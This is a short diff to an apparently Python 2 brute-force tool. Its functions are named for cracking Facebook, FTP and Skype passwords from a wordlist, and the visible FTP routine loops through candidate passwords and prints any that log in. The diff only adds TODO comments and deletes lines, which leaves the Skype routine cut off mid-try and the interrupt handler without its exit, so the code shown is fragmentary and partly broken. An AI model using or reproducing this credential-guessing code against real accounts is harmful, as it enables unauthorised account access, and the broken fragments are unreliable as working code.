@@ -36,7 +36,7 @@ P = '\033[35m'  # purple
 C = '\033[36m'  # cyan
 GR = '\033[37m'  # gray
 
-
+# TODO: FIXXXXXXX!
 def facebookBruteforce(username, wordlist, delay):
     wordlist = open(wordlist, 'r')
     for i in wordlist.readlines():
@@ -69,12 +69,11 @@ def ftpBruteforce(address, username, wordlist, delay, port):
             ftp.retrlines('LIST')
             print G + "[*] Username: %s | [*] Password found: %s\n" % (username, password) + W
             ftp.quit()
+        # TODO: Change to specific exception.
         except ftplib.all_errors as e:
             print R + "[!] OOPs something went wrong! Check if you have typed everything correctly, as well as the FTP directory and port [!]" + W
         except KeyboardInterrupt:
-            print O + "[!] Keyboard Interrupt Detected! Stopping... [!]" + W
             ftp.quit()
-            exit()
         except:
              print O + "[*] Username: %s | [*] Password: %s | Incorrect!\n" % (username, password) + W
              sleep(delay)
@@ -196,5 +195,3 @@ def skypeBruteforce(username, wordlist, delay):
     # Processing wordlist...
     for i in wordlist.readlines():
         password = i.strip("\n")
-        try:
-            
